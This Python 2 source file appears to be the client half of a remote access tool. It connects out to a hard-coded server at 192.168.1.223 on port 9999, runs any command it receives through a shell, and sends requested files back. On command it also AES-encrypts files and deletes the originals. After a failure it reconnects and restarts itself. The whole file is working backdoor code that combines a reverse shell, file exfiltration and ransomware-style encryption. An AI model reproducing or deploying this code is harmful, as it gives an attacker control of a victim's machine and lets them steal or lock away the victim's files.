import os
import socket
import subprocess
import time
import random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
import sys
import smtplib
from GetIP import get_lan_ip
from email import *
import datetime
import threading
from threading import Thread


def socket_create():
    """
    The function creates socket (allows two computers to connect)


    :return: None
    """
    try:
        global host
        global port
        global s
        host = '192.168.1.223'
        # host = get_lan_ip()
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ' + str(msg))


def socket_connect():
    """
    The function connects to a remote socket


    :return: None
    """
    try:
        global host
        global port
        global s
        # print('Binding socket to port: ' + str(port))
        s.connect((host, port))
    except socket.error as msg:
        print('Socket connection error: ' + str(msg))
        time.sleep(5)
        socket_connect()


def send_file(file_path):
    """
    The function sends a file to the server

    :param file_path: The path of the file we want to send
    :type file_path: str

    :return: None
    """
    f = open(str(file_path), 'rb')
    print 'Sending...'
    l = f.read(20480)
    while (l):
        print 'Sending...'
        s.send(l)
        l = f.read(20480)
    f.close()
    print "Done Sending"
    output_str = "The file was sent" + "\n"
    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
    # s.shutdown(socket.SHUT_WR)
    # print s.recv(20480)


def receive_commands():
    """
    The function receives commands from the socket

    :return: None
    """
    while True:
        data = s.recv(20480)
        command = data.decode("utf-8")
        command_with_data = command.split()
        if data[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                pass
        if data[:].decode("utf-8") == 'quit':
            s.close()
            break
        if len(data) > 0:
            # File transfer
            # """
            if data[:8].decode("utf-8") == 'transfer':
                file_name = data[9:].decode("utf-8")
                file_path = str(os.getcwd()) + chr(92) + file_name
                if not os.path.exists(file_path):
                    output_str = "The file does not exist" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
                else:
                    try:
                        send_file(file_path)
                    except:
                        output_str = "Could not transfer the file" + "\n"
                        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                        print(output_str)

            # """
            # The rest of commands



            elif (command_with_data[0] == 'encrypt'):
                file_name = command_with_data[1]
                file_path = str(os.getcwd()) + chr(92) + file_name
                password = command_with_data[2]
                try:
                    encrypt(get_key(password), file_name, file_path)
                    output_str = "File encrypted" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
                except:
                    output_str = "Could not encrypt the file" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
            elif (command_with_data[0] == 'decrypt'):
                file_name = command_with_data[1]
                file_path = str(os.getcwd()) + chr(92) + file_name
                password = command_with_data[2]
                try:
                    decrypt(get_key(password), file_name, file_path)
                    output_str = "File decrypted" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
                except:
                    output_str = "Could not decrypt the file" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)

            else:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_bytes)
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print output_str
                except:
                    output_str = "Command not recognized" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
    s.close()


def get_key(password):
    """
    The program gets a password and coverts it to something we can use
    to encrypt

    :param password: The users picked password
    :type password: str

    :return: a password we can use in encryption
    """
    hasher = SHA256.new(password).digest()
    return hasher


def encrypt(key, filename, filepath):
    chunk_size = 64 * 1024
    output_file = str(os.getcwd()) + chr(92) +"(encrypted)" + filename
    file_size = str(os.path.getsize(filepath)).zfill(16)
    IV = ""

    for i in range(16):
        IV += chr(random.randint(0, 0xFF))
    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filepath, 'rb') as infile:
        with open(output_file,'wb') as output_file:
            output_file.write(file_size)
            output_file.write(IV)

            while True:
                chunk = infile.read(chunk_size)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - (len(chunk) % 16))

                output_file.write(encryptor.encrypt(chunk))
    os.remove(filepath)


def decrypt(key, filename, filepath):
    chunk_size = 64 * 1024
    output_file = str(os.getcwd()) + chr(92) + filename[11:]

    with open(filepath, 'rb') as infile:
        file_size = long(infile.read(16))
        IV = infile.read(16)

        decryptor = AES.new(key,AES.MODE_CBC, IV)
        with open(output_file,'wb') as outfile:
            while True:
                chunk = infile.read(chunk_size)

                if len(chunk) == 0:
                    break

                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(file_size)
    os.remove(filepath)


def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Error in main")
        time.sleep(5)
    s.close()
    main()


if __name__ == '__main__':
    main()